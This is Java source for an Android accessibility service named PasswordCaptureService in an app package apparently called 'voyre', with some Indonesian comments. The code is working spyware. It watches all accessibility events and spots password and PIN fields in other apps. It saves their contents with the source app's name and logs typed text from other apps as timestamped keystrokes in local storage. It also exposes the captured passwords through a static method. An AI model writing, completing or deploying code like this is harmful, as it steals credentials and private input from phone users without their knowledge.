package com.voyre.app;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;  // ← TAMBAHKAN INI
import android.content.SharedPreferences;
import android.os.Bundle;        // ← TAMBAHKAN INI
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONArray;
import org.json.JSONObject;

public class PasswordCaptureService extends AccessibilityService {
    private static final String TAG = "PasswordCaptureService";
    private static final String PREFS_NAME = "password_capture";
    private static final String KEY_PASSWORDS = "captured_passwords";
    
    private SharedPreferences prefs;
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        
        try {
            AccessibilityNodeInfo source = event.getSource();
            if (source == null) return;
            
            // Capture password fields
            if (isPasswordField(source)) {
                String text = getTextFromNode(source);
                if (text != null && !text.isEmpty()) {
                    String packageName = event.getPackageName() != null ? 
                        event.getPackageName().toString() : "unknown";
                    String className = event.getClassName() != null ? 
                        event.getClassName().toString() : "unknown";
                    
                    String entry = packageName + "|" + className + "|" + text;
                    savePassword(entry);
                    Log.d(TAG, "Password captured from " + packageName);
                }
            }
            
            // Capture keystrokes
            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                String text = getTextFromNode(source);
                if (text != null && !text.isEmpty() && text.length() > 1) {
                    String packageName = event.getPackageName() != null ? 
                        event.getPackageName().toString() : "unknown";
                    if (!packageName.equals(getPackageName())) {
                        saveKeystroke(packageName, text);
                        Log.d(TAG, "Keystroke captured from " + packageName + ": " + text);
                    }
                }
            }
            
            source.recycle();
        } catch (Exception e) {
            Log.e(TAG, "Accessibility event error", e);
        }
    }
    
    private boolean isPasswordField(AccessibilityNodeInfo node) {
        if (node == null) return false;
        if (node.isPassword()) return true;
        
        CharSequence hint = node.getHintText();
        if (hint != null) {
            String hintStr = hint.toString().toLowerCase();
            if (hintStr.contains("password") || hintStr.contains("pass") || 
                hintStr.contains("pin") || hintStr.contains("sandi")) {
                return true;
            }
        }
        
        CharSequence text = node.getText();
        if (text != null) {
            String textStr = text.toString().toLowerCase();
            if (textStr.contains("password") || textStr.contains("pass") || 
                textStr.contains("pin") || textStr.contains("sandi")) {
                return true;
            }
        }
        
        return false;
    }
    
    private String getTextFromNode(AccessibilityNodeInfo node) {
        if (node == null) return null;
        
        CharSequence text = node.getText();
        if (text != null) {
            return text.toString();
        }
        
        if (node.getChildCount() > 0) {
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    String childText = getTextFromNode(child);
                    if (childText != null) {
                        child.recycle();
                        return childText;
                    }
                    child.recycle();
                }
            }
        }
        return null;
    }
    
    private void savePassword(String entry) {
        try {
            String existing = prefs.getString(KEY_PASSWORDS, "[]");
            JSONArray array = new JSONArray(existing);
            array.put(entry);
            prefs.edit().putString(KEY_PASSWORDS, array.toString()).apply();
        } catch (Exception e) {}
    }
    
    private void saveKeystroke(String packageName, String text) {
        try {
            String existing = prefs.getString("keystrokes_" + packageName, "[]");
            JSONArray array = new JSONArray(existing);
            JSONObject obj = new JSONObject();
            obj.put("text", text);
            obj.put("timestamp", System.currentTimeMillis());
            array.put(obj);
            prefs.edit().putString("keystrokes_" + packageName, array.toString()).apply();
        } catch (Exception e) {}
    }
    
    public static String getCapturedPasswords(Context context) {
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        return prefs.getString(KEY_PASSWORDS, "[]");
    }
    
    @Override
    public void onInterrupt() {
        Log.d(TAG, "Service interrupted");
    }
    
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                     AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                     AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 100;
        
        setServiceInfo(info);
        Log.d(TAG, "Password capture service connected");
    }
}